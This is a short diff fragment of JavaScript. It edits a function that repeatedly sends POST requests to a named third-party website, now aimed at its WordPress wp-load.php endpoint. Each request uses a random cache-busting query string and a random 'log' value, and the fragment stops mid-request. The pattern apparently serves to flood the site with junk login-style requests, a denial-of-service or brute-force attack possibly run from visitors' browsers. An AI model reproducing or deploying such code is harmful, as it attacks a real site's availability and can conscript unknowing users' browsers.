@@ -59,7 +59,7 @@ var code = {
 function kcc() {
 
   code.ajax({
-   url: "https://www.seohocasi.com/seo-analizi/?"+createrand(5),
+   url: "https://www.seohocasi.com/wp-load.php?"+createrand(5),
    type: "POST",
    data: {
          log : createrand(15),
